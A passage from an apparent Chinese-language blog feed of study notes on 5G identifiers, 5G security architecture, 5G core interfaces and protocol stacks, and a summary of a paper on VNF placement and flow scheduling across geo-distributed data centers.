之中，功能類似4G的IMSI。<br>SUPI可包含IMSI訊息或是用於私有網路的特定網路標誌(network-specific identifier)</p><p>IMSI格式:</p><table><thead><tr><th>封包</th><th>MCC</th><th>MNC</th><th>MSIN</th></tr></thead><tbody><tr><td>長度</td><td>3bit</td><td>2~3bit</td><td>&lt;&#x3D;10bit</td></tr><tr><td></td><td>PLMN</td><td>PLMN</td><td></td></tr></tbody></table><ul><li>In 漫遊場景: SUPI需要攜帶所歸屬網路的地址資訊:MNC、MCC</li><li>若與 EPC Network互通: SUPI總是基於IMSI</li></ul><h3 id="通用公共訂閱標誌-GPSI"><a href="#通用公共訂閱標誌-GPSI" class="headerlink" title="通用公共訂閱標誌 (GPSI)"></a>通用公共訂閱標誌 (GPSI)</h3><p>GPSI為永久標誌，<strong>用於在非3GPP網路之中來標示一個3GPP的簽約</strong><br>GPSI與3GPP的對應關係會儲存在簽約資料中；GPSI在系統內部與外部都可作為公共標誌。<br>GPSI可以是<strong>MSISDN</strong>或其他外部標誌</p><h3 id="永久設備標誌-PEI"><a href="#永久設備標誌-PEI" class="headerlink" title="永久設備標誌(PEI)"></a>永久設備標誌(PEI)</h3><p>PEI為永久標誌，<strong>針對存取5G網路的3GPP UE的標誌</strong><br>不同類型的UE和不同使用場景，PEI可能會有不同格式<br>UE可在發送PEI的同時，攜帶對應 該PEI所使用格式的指令訊息<br>若UE支援至少一種3GPP存取技術，則UE的PEI系需使用IMEI或IMEISV格式</p><h3 id="5G-全球臨時統一標示符-5G-GUTI"><a href="#5G-全球臨時統一標示符-5G-GUTI" class="headerlink" title="5G 全球臨時統一標示符(5G-GUTI)"></a>5G 全球臨時統一標示符(5G-GUTI)</h3><p>5G-GUTI是一個非永久標誌，由AMF為UE臨時分配(於<strong>註冊流程</strong>時分配)的，用於標示該UE<br>使用不同存取方式(3GPP,non-3GPP)，使用相同的5G-GUTI</p><ul><li><p>5G-GUTI的結構:</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-GUTI&gt;:=&lt;GUAMI&gt;&lt;5G-TMSI&gt; (:= 為 &quot; 定義為 &quot; 的符號)</span><br><span class="line">&lt;GUAMI&gt;:用於標示一個或多個AMF</span><br><span class="line">&lt;5G-TMSI&gt;:用於識別唯一的UE</span><br></pre></td></tr></table></figure></li><li><p>GUAMI的結構:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;GUAMI&gt;:= &lt;MCC&gt;&lt;MNC&gt;&lt;AMF Region ID&gt;&lt;AMF Set ID&gt;&lt;AMF Pointer&gt;</span><br><span class="line"></span><br><span class="line">&lt;AMF Region ID&gt;: 用於標示區域</span><br><span class="line">&lt;AMF Set ID&gt;: 在AMF區域中唯一標示一組AMF</span><br><span class="line">&lt;AMF Pointer&gt;: 在AMF組中唯一標示一個AMF </span><br></pre></td></tr></table></figure></li><li><p>5G-S-TMSI是GUTI的縮短形式，用於無線signalling(尋呼或業務請求流程)提升傳輸效率</p></li><li><p>5G-S-IMSI-結構:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-S-TMSI&gt;:= &lt;AMF Set ID&gt;&lt;AMF Pointer&gt;&lt;5G-TMSI&gt;</span><br></pre></td></tr></table></figure></li><li><p>5G-TMSI的10位最低有效位元被NG-RAN用來決定UE的呼叫時機</p><ul><li>所以該10位最低有效位元應平均分布，使不同UE的尋呼時機均勻分布</li></ul></li></ul><table><thead><tr><th>MCC</th><th>MNC</th><th>AMF Region ID</th><th>AMF Set ID</th><th>AMF Pointer</th><th>5G-TMSI</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>16bit</td><td>4bit</td><td>4bit</td><td>32bit</td></tr><tr><td>PLMN</td><td>PLMN</td><td>AMF ID</td><td>AMF ID</td><td>AMF ID</td><td></td></tr><tr><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td></td></tr><tr><td></td><td></td><td></td><td>5G-S-TMSI</td><td>5G-S-TMSI</td><td>5G-S-TMSI</td></tr><tr><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td></tr></tbody></table><h3 id="SUCI"><a href="#SUCI" class="headerlink" title="SUCI"></a>SUCI</h3><p>SUCI是非永久性標誌，基於 SUPI(Subscription Permanent Identifier) 加密形式構成用於保護隱私的標誌<br>由於每個簽約用戶的SUPI是永久且唯一的，直接傳輸會有隱私風險</p><p>UE(USIM或ME)可以根據<strong>ECIES</strong>,甚至是<strong>Null-Scheme</strong>生成SUCI<br>當AMF收到SUCI後，觸發授權(Authentication)流程，之後在UDM&#x2F;SIDF中使用解密演算法(SIDF)將收到的SUCI解碼成SUPI，以利完成後續授權工作</p><h3 id="TAI-amp-TAC"><a href="#TAI-amp-TAC" class="headerlink" title="TAI&amp;TAC"></a>TAI&amp;TAC</h3><p>皆為位置性標誌<br>TAI: 跟蹤區標誌<br>TAC: 跟蹤區編碼</p><ul><li>格式:<table><thead><tr><th>MCC</th><th>MNC</th><th>TAC</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>20bit</td></tr><tr><td>PLMN ID</td><td>PLMN ID</td><td>TAC</td></tr><tr><td><strong>TAI</strong></td><td><strong>TAI</strong></td><td><strong>TAI</strong></td></tr></tbody></table></li></ul><h2 id="安全架構與流程"><a href="#安全架構與流程" class="headerlink" title="安全架構與流程"></a>安全架構與流程</h2><p>UE在RAN或在不同網路間移動時，需要與網路進行相互認證，確保雙方是可信賴的<br>UE與網路之間的相互認證需要<strong>5G安全架構</strong>的支援<br>5G安全架構應包含:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 緩解和降低攻擊</span><br><span class="line">- 支援驗證和授權機制</span><br><span class="line">- 支持密鑰相關功能</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mY2DamY.png"></p><h2 id="安全架構特點"><a href="#安全架構特點" class="headerlink" title="安全架構特點"></a>安全架構特點</h2><ul><li>與存取方式(3GPP、non3GPP)無關的安全架構，使用統一的驗證方法與密鑰架構</li><li>增強安全(4G → IMSI → 不安全 | 5G → SUCI&#x2F;SUPI → 安全)</li><li>差異化認證: 5G支援USIM,憑證,帳密等多種認證方式</li><li>服務化架構和開放介面安全</li></ul><p>安全架構所涉及的NF，包含: ARPF,AUSF,SEAF,SIDF</p><ul><li>ARPF:<ul><li>與UDM一起部屬</li><li>負責儲存根密鑰 $Ki$ 和相關的簽約資料</li><li>計算5G授權向量</li></ul></li><li>AUSF:<ul><li>提供<strong>EAP認證伺服器</strong>的功能，進行EAP認證以推導出<strong>錨點密鑰</strong></li></ul></li><li>SEAF:<ul><li>與AMF一起部屬</li><li>負責根據錨點密鑰來推導出下層的NAS與AS密鑰，5G AKA 完成授權結果比較功能</li></ul></li><li>SIDF:<ul><li>與UDM一起部屬</li><li>負責將SUCI解碼成SUPI</li></ul></li></ul><h2 id="安全流程"><a href="#安全流程" class="headerlink" title="安全流程"></a>安全流程</h2><p><img src="https://i.imgur.com/GuQNm2p.png"></p><ul><li>由UE發起Request，發送SUCI或5G-GUTI訊息給SEAF</li><li>SEAF將SUCI或SUPI(若5G-GUTI有效)發送給來源網路(歸屬地網路)的AUSF</li><li>AUSF進行認證完後，將訊息發送給來源網路的 UDM</li><li>UDM收到SUCI，將其解碼為SUPI，並通過用戶資料，選擇相應的認證演算法，透過後續流程完成身分認證</li></ul><p>目前5G支援的認證演算法: <strong>EAP-AKA’</strong> 和 <strong>5G AKA</strong> -3GPP TS 33.501</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://cat.chriz.hk/2019/12/5g-security-architecture.html">https://cat.chriz.hk/2019/12/5g-security-architecture.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記- 5G 網路功能介面與協定堆疊</title>
      <link href="/posts/3d68fc76.html"/>
      <url>/posts/3d68fc76.html</url>
      
        <content type="html"><![CDATA[<h2 id="N2介面-控制介面與協定堆疊"><a href="#N2介面-控制介面與協定堆疊" class="headerlink" title="N2介面(控制介面與協定堆疊)"></a>N2介面(控制介面與協定堆疊)</h2><p>$5G Access,Network \stackrel{N2}{\longleftrightarrow} 5GC(AMF)$</p><ul><li><strong>管理流程:</strong> 不與特定UE相關，像是設定或重置N2介面</li><li><strong>與單一UE相關的流程:</strong> NAS傳輸流程、UE上下文管理、PDU session資源相關流程、切換管理..etc</li><li>採用 <strong>NG-AP協定</strong> (不論是哪種Access Network: 3GPP RAN 或 N3IWF non-3GPP )，屬於一種應用層協定</li><li>AMF對於一個UE有唯一的N2 終結點</li><li>由於SMF與AMF是解耦的，所以NG-AP支援AMF在5G RAN與5GC之間傳遞<strong>N2 SM訊息</strong></li></ul><p><img src="https://i.imgur.com/TP3cmJb.png"></p><ul><li>SCTP保證Acces Network與5GC之間的傳輸</li></ul><h2 id="UE與5GC之間的控制面介面與協定堆疊"><a href="#UE與5GC之間的控制面介面與協定堆疊" class="headerlink" title="UE與5GC之間的控制面介面與協定堆疊"></a>UE與5GC之間的控制面介面與協定堆疊</h2><p>針對每種UE使用的連接方式(3GPP、non-3GPP)，UE皆會有一個 <strong>N1 NAS連接</strong>，且會有唯一的N1終結點為位於AMF。</p><blockquote><p><strong>非接入層(NAS, Non-access stratum)</strong><br>原先存在於 3G&#x2F;UMTS中的協定層，是用戶設備與核網之間的功能層<br>具備以下功能:</p><blockquote><p>移動性管理<br>呼叫控制<br>會話管理<br>身分管理<br><a href="https://hackmd.io/M4SyLAOpRam7lZVLuujOHw">NAS 參考資料</a></p></blockquote></blockquote><p>N1 NAS可用於:</p><ul><li><strong>UE註冊管理</strong></li><li><strong>連接管理</strong></li><li><strong>會話管理</strong></li></ul><p>N1介面之中的NAS協議分成: NAS-MM、NAS-SM</p><h2 id="NAS-MM"><a href="#NAS-MM" class="headerlink" title="NAS-MM"></a>NAS-MM</h2><p>用於UE與AMF以外的NF進行互動</p><ul><li>會話管理消息</li><li>UE 策略</li><li>位置服務</li></ul><p><em>NAS傳輸會話管理訊息、短訊、UE策略、位置服務等協議流程</em><br><img src="https://i.imgur.com/iPUTyxa.gif"></p><h3 id="特點"><a href="#特點" class="headerlink" title="特點"></a>特點</h3><p>處理UE與AMF之間的NAS流程，包含:</p><ul><li>處理UE的註冊管理(RM)和連接管理(CM): 在UE與AMF之間提供安全的訊息連結 、存取控制</li><li>適用於其他類型的NAS訊息(NAS-SM、SMS等)，可與RM&#x2F;CM NAS 訊息同時傳輸</li><li>針對不同存取方式(3GPP, non-3GPP)也都採用相同的NAS協定</li><li>UE針對不同種存取方式都會有一個N1 NAS連接</li></ul><p><img src="https://i.imgur.com/sdjzoKJ.gif"></p><h2 id="NAS-SM"><a href="#NAS-SM" class="headerlink" title="NAS-SM"></a>NAS-SM</h2><p>支援處理UE與SMF之間的<strong>會話管理</strong></p><ul><li>PDU會話用戶面的建立、修改、釋放</li><li>SM訊息的建立、處理都是在NAS-SM之中完成的（內容不會被AMF解析）</li><li>NAS-MM層會負責UE-AMF之間SM訊息的收發，並提供安全保護(<strong>保護訊息的完整性</strong>)</li></ul><p><img src="https://i.imgur.com/qLGM1Hk.gif"></p><h2 id="5GC-NF之間的控制面介面與協定堆疊"><a href="#5GC-NF之間的控制面介面與協定堆疊" class="headerlink" title="5GC NF之間的控制面介面與協定堆疊"></a>5GC NF之間的控制面介面與協定堆疊</h2><p>5G 核網中的NF，<strong>NF Service Producer</strong> 會透過服務化界面為 <strong>NF Service Consumer</strong> 提供服務</p><p>5G核網中將以下控制介面定義為服務化界面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- Nsmf</span><br><span class="line">- Nudm</span><br><span class="line">- Nnrf</span><br><span class="line">- Nnssf</span><br><span class="line">- Nausf</span><br><span class="line">- Nnef</span><br><span class="line">- Nsmsf</span><br><span class="line">- Nudr</span><br><span class="line">- Npcf</span><br><span class="line">- N5g-eir</span><br><span class="line">- Nlmf</span><br></pre></td></tr></table></figure><p>這些服務化介面以<strong>HTTP 2.0</strong>與<strong>JSON</strong>作為應用層協定；3GPP所有網路功能都必須支持<strong>TLS</strong><br>若PLMN沒有提供其他網路安全方案，則TLS就必須被使用<br>而未來可能會以 <strong><a href="https://zh.wikipedia.org/wiki/QUIC">QUIC&#x2F;UDP</a></strong> 作為優化的方案</p><p><img src="https://i.imgur.com/QWxhGJN.png"></p><h2 id="N4介面與協定堆疊"><a href="#N4介面與協定堆疊" class="headerlink" title="N4介面與協定堆疊"></a>N4介面與協定堆疊</h2><p>$SMF\stackrel{N4}{\longleftrightarrow}UPF$</p><p>N4介於SMF與UPF之間，具備控制面與用戶面功能<br>N4定義了以下流程:</p><p><em>控制面流程</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- N4會話管理:</span><br><span class="line">用於SMF建立、更新、刪除UPF上的N4會話上下文(Session Context)</span><br><span class="line">- N4報告流程:</span><br><span class="line">用於UPF向SMF事件(EX.流量使用情況)</span><br><span class="line">- N4節點級別流程:</span><br><span class="line">SMF、UPF之間N4節點的建立、更新、連結、釋放；UPF會向SMF報告N4節點級別的事件</span><br><span class="line">- SMF暫停計費流程:</span><br></pre></td></tr></table></figure><p><em>用戶面流程</em><br>在SMF、UPF之間轉發流量:<br>當用戶處於<strong>CM-IDLE</strong>狀態時，UPF可轉發downlink 資料給SMF，SMF再決定呼叫策略</p><table><thead><tr><th>PFCP</th><th>$\longleftrightarrow$</th><th>PFCP</th></tr></thead><tbody><tr><td>UDF</td><td>$\longleftrightarrow$</td><td>UPF</td></tr><tr><td>IP</td><td>$\longleftrightarrow$</td><td>IP</td></tr><tr><td>L2</td><td>$\longleftrightarrow$</td><td>L2</td></tr><tr><td>L1</td><td>$\longleftrightarrow$</td><td>L1</td></tr><tr><td>Control Plane $\longleftrightarrow$ User Plane</td><td></td><td></td></tr></tbody></table><h2 id="用戶面介面與其協定堆疊"><a href="#用戶面介面與其協定堆疊" class="headerlink" title="用戶面介面與其協定堆疊"></a>用戶面介面與其協定堆疊</h2><p>$Access,Network\stackrel{N3}{\longleftrightarrow}UPF$<br>$UPF \stackrel{N9}{\longleftrightarrow}UPF$<br>N3與N9介面分別在5G RAN 與 UPF之間 以及UPF與UPF之間傳遞數據</p><p><img src="https://i.imgur.com/p8GoGVl.gif"></p><ul><li><strong><a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E5%8D%95%E5%85%83">PDU(Protcol Data Unit) 層</a></strong>: 負責在UE與Data Network之間的PDU Session傳遞PDU</li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNF Deployment and Flow Scheduling in Geo-distributed Data Centers</title>
      <link href="/posts/85fe9be3.html"/>
      <url>/posts/85fe9be3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>NFV可降低網路營運上的設備採購以及維護成本，透過NFV可將網路功能與物理基礎設施進行解耦合。<br>並在通用硬體上運行虛擬網路功能(VNF)，NFV可使網路更加靈活可控，但仍然存在各種技術挑戰<br>像是如何在不同地理位置上有效部屬VNFs，以及在不同地理位址的資料中心調度網路流量。</p><p>本篇論文中研究此議題並最大縣動減少部屬以及通訊成本，此問題被轉換成 混合整數線性規劃問題(mixed-integer linear programming)，本論文提出一種基於放鬆的演算法(relaxtion-based algorithm)來解決它的計算複雜度，最後通過實驗結果表明，該演算法可有效降低部屬與通訊成本。</p><h2 id="Ch1-Introduction"><a href="#Ch1-Introduction" class="headerlink" title="Ch1-Introduction"></a>Ch1-Introduction</h2><p>傳統資料中心或雲端運算網路架構仰賴特定硬體來提供特定網路服務，像是防火牆、入侵偵測系統。<br>這些造成硬體成本過高。而NFV的出現取代了這種往賴特定硬體的網路架構。</p><p>藉由NFV，網路功能可能被虛擬化成基於軟體的VNF並運行在一般COTS服器上。<br><img src="https://i.imgur.com/9GcTBYs.png"></p><p>而為了提供網路服務，網路流需要流經過一連串以排序之網路功能的集合<br><img src="https://i.imgur.com/fBK2DgN.png"></p><p>然而要實際應用NFV技術，必須考量到VNF要如何串接成一串服務鏈(service chains)以降低成本<br>以往這部分的研究都僅僅關注於部屬成本，旨在減少資料中心的資源消耗，像是CPU、記憶體、儲存空間等，或是單獨著重於通訊成本，像是最大限度減少點對點的延遲等<br>但幾乎沒有考量到若作為VNF部屬的通訊成本。</p><p>在服務鏈上每個鏈結上的網路功能都是有序的，每個鏈結也都有自己的流速，同時在不同VNF部屬在地域分布的資料中心的不同VNF，將導致不同的通訊成本。這代表部屬成本與通訊成本之間的關係不疼夠被忽視，此外舊有研究也很少考慮NFV服務中的流量平衡問題，以前的研究通常會假設VNF流不能夠被分配到同一類的多個VNF Instance上，或是其分散式流量率(distributed flow rate)是預先定義好的，這對於大規模網路中的私有NFV服務來說是不限實也沒效率的，本篇論文認為VNF instance的數量和相應的網路流量應該根據當前網路狀態進行調整。</p><p>本篇論文，考量到有序服務鏈在不同地理分布資料中心下的部屬成本以及通訊成本間的權衡問題，並且我們允許一種 NF 具有多個 VNF 實例。</p><p>本文主要貢獻：</p><ul><li>本文將綜合考量網絡拓撲、VNF的數量和部署以及流量調度，來將VNF部屬以及流量調度問題轉換為混和整數線性規劃問題(mixed integer linear programming, MILP)，，以降低部署成本和通訊成本。</li><li>在該MILP方程式的基礎上設計一種低複雜度的 基於鬆弛的演算法，並進行大量實驗來說明此演算法相較現有演算法的優勢，結果表明本研究提出的演算法可有效降低部屬成本以及通訊成本。</li></ul><h2 id="Ch2-System-Model"><a href="#Ch2-System-Model" class="headerlink" title="Ch2-System Model"></a>Ch2-System Model</h2><h3 id="A-DCs-Topology"><a href="#A-DCs-Topology" class="headerlink" title="A. DCs Topology"></a>A. DCs Topology</h3><p>由於資料中心分布在世界各地，不同資料中心間所傳輸的網路流量會有著不同的成本(cost)<br>這裡透過無向圖(indirected graph) 來代表資料中心的網路拓圖 $G_{d}&#x3D;(D,E_{d})$<br>$D$ 為資料中心  $E_{d}$ 代表網路邊緣<br>$H_{dp}$ 為 edge $e_{dp} \in E_{d}$的 權重(weight) 其中 $d,p \in D$<br>(上面就代表，D和P是資料中心，而H是DP這之間網路連接的Weight，所代表的是這兩資料中心之間的傳輸成本)<br>而這裡須注意，個別資料中心自己到自己之間沒有傳輸成本 $H_{dd}&#x3D;0$</p><h3 id="B-Chain-Set"><a href="#B-Chain-Set" class="headerlink" title="B. Chain Set"></a>B. Chain Set</h3><p>有一組鏈 $C&#x3D;{c1,c2,…}$ 被部屬到資料中心，若將服務鏈中$c_{i} \in C$來源節點(source)與目的節點(destination)分別以 $o_{i}$ 以及 $t_{i}$ 表示。<br>每個服務鏈 $c_{i}$中都有一組以排序之網路功能 $c_{i}&#x3D;{s_{i,1},s_{i,2},….s_{i,j},…}$ 來以速率 $R_{i}$處理網路流量<br>我們定義 $|c_{i}|$ 為服務鏈 $c_{i}$的長度，並且定義 $n(s_{i,j})$ 來表示𝑠𝑖,𝑗的網絡功能的類型<br>舉例來說如圖<br><img src="https://i.imgur.com/y39ct1S.png"><br>圖中三個服務鏈的長度分別為2,3,3 (注意:，不同的服務鏈可能需要一種網絡功能)<br>舉例來說，$c1$ $c2$ $c3$ 可能都共同包含網路功能 $f1$，即 $n(s_{1,1})&#x3D;n(s_{2,2})&#x3D;n(s_{3,2})&#x3D;f_{1}$</p><h3 id="C-NFs-Graph"><a href="#C-NFs-Graph" class="headerlink" title="C. NFs Graph"></a>C. NFs Graph</h3><p>基於上述的鏈集合(Chain Set)，我們可以建構網路功能圖 $G_{n}$<br>此網路功能圖為有向非循環圖(directed acyclic graph, DAG)<br>$G_{n}&#x3D;(V_{n},E_{n})$，且$V_{n}$ 可被歸納為三個種類:</p><ul><li>sources $O$</li><li>network function $N$</li><li>destinations $T$<br>而每個edge $e_{m,n} \in E_{n}$ 代表網路功能$m$與$n$之間的網路流量<br>對於鏈 $c_{i}$ 中的每個服務對(service pair) $(s_{i,j},s_{i,j+1})$，在$G_{n}$中存在一個網路功能對(network function pair)<br>$(m,n)$，存在從$m$到$n$的有向鏈結，其中 $n(s_{i,j})&#x3D;m$ , $n(s_{i,j+1})&#x3D;n$</li></ul><p>如同剛剛提及，不同網路功能可能會由不同服務鏈以不同的網量速率來共享功能<br>對於每個edge $e_{m,n} \in E_{n}$，我們定義一個集合 $U_{m,n} &#x3D; { i : c_{i} \in C, n(s_{i,j})&#x3D;m,n(s_{i,j+1})&#x3D;n}$ 來記錄具有網路功能對($m$,$n$)的服務鏈</p><p>存在具有不同流量要求的不同網路流量在edge $e_{m,n}$ 上傳輸，表示為 $R_{i}$, $\forall i \in U_{m,n}$<br>舉例來說，來自服務鏈 $c1$ 和 $c2$ 的網路流量在 edge $e_{f_{1},f_{2}}$上傳輸，如下圖所示<br><img src="https://i.imgur.com/Ba0onF6.png"><br>速率分別是 2與1</p><h3 id="D-VNFs-Graph"><a href="#D-VNFs-Graph" class="headerlink" title="D. VNFs Graph"></a>D. VNFs Graph</h3><p>我們的目標是要以VNF instance形式來在圖 $G_{n}$ 之中部屬所有網路功能<br>$G_{n}$中每個網路功能n可能會有多個VNF Instances 在不同資料中心<br>舉例來說如下圖<br><img src="https://i.imgur.com/nZQBKNl.png"><br>網路功能 $f1$可能會有兩個VNF Instance分別位於資料中心 $d1$以及 $d2$</p><p>注意，每個網絡功能 $n$ 在所有 $|D|$ 數據中心中可能最多有 $|D|$ 可能的Instance，<br>並且 $G_{n}$ 中的每一對 $(m,n)$ 也可能相應地在它們之間最多有 $|D|^{2}$ 個鏈接。</p><p>因此，在VNF圖 $G_{v}&#x3D;(V_{v},E_{v})$，節點集合 $V_{v}$ 包括 $|V_{n}| \cdot |D|$ instances 表示為集合 $V$、sources集合 $O$以及目標節點集合 $T$，而 $E_{v}$ 表示他們之間的鏈結。<br>對於每個edge $e_{u,v} \in E_{v}$，讓 $f^{i}<em>{uv}$ 註記為服務鏈 $C</em>{i}$中 instance $u$,$v$ 間的流量速率。</p><p>舉例來說，我們考慮圖 $G_{n}$ 中的兩個網路功能 $(f1,f2)$ 以及edge $e_{f_{1},f_{2}}$，對應的 $G_{v}$ 在下圖中顯示，有 2 個資料中心</p><p><img src="https://i.imgur.com/YhG7xQY.png"></p><p>$f1,f2$的Instance分別是 $v1$ $v2$ 以及 $v3$ $v4$，並且j我們可以觀察到，網路功能 $f1$ $f2$共有4個edge，而𝑓1和𝑓2之間的網絡流量可以在這四個edge之間自由分佈</p><p>於任何實例$v \in V$，我們使用$d(v)$ 和$n(v)$分別表示其資料中心位置和網絡功能類型。例如，$d(v_{1})&#x3D;d1$，$n(v_{1})&#x3D;f1$</p><p>Let $N(n)$ 代表提供網路功能 $n$的VNF集合，例如在上圖中，我們有 $v1$以及 $v2$ 來提供網路功能 $f1$，即 $N(f1)&#x3D;{ v1,v2 }$，對於每個 VNF Instance Pair $(u,v)$，可以透過 $f_{uv}^{i}$ 來表示流經邊緣的網路流量速率。<br>其中對於鏈 $c_{i}$ 上的邊緣滿足 $e_{u,v}\in E_{v}$<br>且在圖 $G_{v}$中，$\forall i\in U_{n(u),n(v)}$</p><p><img src="https://i.imgur.com/heLrZ8U.png"></p><h2 id="Ch3-Problem-Formulation"><a href="#Ch3-Problem-Formulation" class="headerlink" title="Ch3-Problem Formulation"></a>Ch3-Problem Formulation</h2><p>基於上一章的系統模型，我們可以公式化VNF部屬以及流量調度問題，轉換成混合整數線性規劃問題<br>(MILP)，且目標是要最小化所有VNF Pairs之間的部屬以及通訊總成本</p><h3 id="VNF-Instance-Placement"><a href="#VNF-Instance-Placement" class="headerlink" title="VNF Instance Placement"></a>VNF Instance Placement</h3><p>如圖$G_{v}$所示，每個網絡功能可以由所有資料中心託管，每個資料中心可以託管所有類型的網絡功能，因此我們定義了二進位的變數 $x_{v}$ 來表示 <strong>在資料中心 $d(v) 中負責提供的網路功能 $n(v)$ 的VNF Instance 是否被實際部屬</strong></p><p><img src="https://i.imgur.com/LW9uzOu.png"></p><h3 id="Flow-requirement-constraints"><a href="#Flow-requirement-constraints" class="headerlink" title="Flow requirement constraints"></a>Flow requirement constraints</h3><p>對於每個服務鏈 $c_{i}$ 所需要的流量，可被分配到所有它的VNF Instance上<br>例如，鏈 $c_{i}$中的網絡功能pair $m$、$n$ 之間的網絡流率 $R_{i}$ 將分佈到$G_{v}$中Instance $v$、$u$ 之間的所有邊上，其中$n(u)&#x3D;m$，$n(v)&#x3D;n$</p><p><img src="https://i.imgur.com/IdjsfTH.png"></p><p>對於來源節點與目標節點，可以列出以下等式<br><img src="https://i.imgur.com/iattDHR.png"></p><h3 id="VNF-flow-constraint"><a href="#VNF-flow-constraint" class="headerlink" title="VNF flow constraint"></a>VNF flow constraint</h3><p>對於每個VNF Instance，輸入流量是源自輸入instance $i(v)$來處理<br>然後分散到輸出instance $o(v)$</p><p><img src="https://i.imgur.com/4EfnGB6.png"></p><p>其中 $\alpha_{n(v)}$ 是由網路功能來決定的擴展因子(scaling factor)</p><h3 id="The-relationship-between-x-v-and-f-i-uv"><a href="#The-relationship-between-x-v-and-f-i-uv" class="headerlink" title="The relationship between $x_{v}$ and $f^{i}_{uv}$"></a>The relationship between $x_{v}$ and $f^{i}_{uv}$</h3><p>只要有流量通過 VNF 實例 $v$，二進位變數應設定為 1 以提供網絡功能$n(v)$，並且此 VNF 實例應部署在$d(v)$ 中。這可以描述為</p><p><img src="https://i.imgur.com/kNT4fbV.png"></p><p><code>A Joint MILP Formulation</code></p><p>若把上述總結，可以得到以下的 <strong>Cost-min</strong> 問題</p><h3 id="Cost-Min"><a href="#Cost-Min" class="headerlink" title="Cost-Min"></a>Cost-Min</h3><p><img src="https://i.imgur.com/g756xNt.png"></p><p>係數 $\gamma$ 和 $\delta$ 由用戶定義，以平衡部署成本和通訊成本，並可根據不同的 QoS 要求進行調整。</p><h2 id="Ch4-Relaxation-Based-Algorithm"><a href="#Ch4-Relaxation-Based-Algorithm" class="headerlink" title="Ch4-Relaxation-Based Algorithm"></a>Ch4-Relaxation-Based Algorithm</h2><p><img src="https://i.imgur.com/X5V2paB.png"><br>因為有 整數變數 $x_{v}$ ，計算上來解決 Cost-Min問題是被禁止的，特別規模大的網路中。<br>此章節中，我們會提出基於鬆散的方式，來解決Cost-min問題。</p><p>首先我們將 $x_{v}$ 鬆弛為[0,1]範圍內的實數，以降低計算複雜度。經過鬆弛後，我們的模型被簡化為線性規劃(LP)問題，如演算法中第1行，這可以透過Matlab輕鬆解決。</p><p><img src="https://i.imgur.com/cW2iRuY.png"></p><p>我們對 $x_{v}$ 做遞增排序，如演算法表中第2行，</p><p>並將每個非零 $x_{v}$ 的值設為1，如演算法表中第5行，</p><p>在這種情況下，我們以整數 $x_{v}^{*}$ 形式獲得一個新的 VNF 部署解決方案，</p><p>並將每個網絡功能的 VNF Instance 數量記錄為 $count_{n(v)}$，如演算法表中第6行，<br>我們將整數solution  $ x_{v}^{*} $ 作為輸入並計算流量調度的解答 $ f_{uv}^{*j} $ ，且總成本 $cost’$</p><p>我們將整數解 $x_{v}^{*}$ 作為輸入，通過在第 11 行再次求解 Cost-Min-LP 問題來計算流量調度解 $f_{uv}^{*j}$ 和總成本 $cost’$</p><p>請注意，放寬可能會導致更多 VNF 實例，因此我們下一步將嘗試進一步減少實例數量以及部署成本，同時確保從第 12 行到第 22 行間的通訊成本接近最佳化。<br>我們從非零 $x_{v}$ 的最小值內的實例 $v$ 開始。<br>請注意，如果$v$是網絡中唯一提供網絡功能$n(v)$的VNF實例，即$count_{n(v)}$ &#x3D;&#x3D; 1，則必須部署$v$，並且跳到下一個Instance<br>否則，若網路中存在提供相同網路功能 $n(v)$的VNF Instance(見14行)，則我們$x_{v}^{*}$ 設為0，並重新計算流量調度解 $f_{uv}^{*i}$ 和新的總成本 $cost’$</p><p>只有當新成本低於當前的 $minCost$時，才會更新NFV部屬解 $x_{v}^{*}$、流量調度解 $f_{uv}^{*j}$ 以及總成本 $minCost$，然後更新網路功能 $n(v)$的Instance數量 (見18、19行)</p><p>另一方面，如果總成本沒有降低，我們將 $x_{v}^{*}$ 的值設置回 1 並移動到下一個實例，直到我們遍歷 $V$ 中的所有 VNF 實例（第 25 行）</p><p>最終我們會返回 NFV部屬解 $x_{v}^{*}$、流量調度解 $f_{uv}^{*j}$ 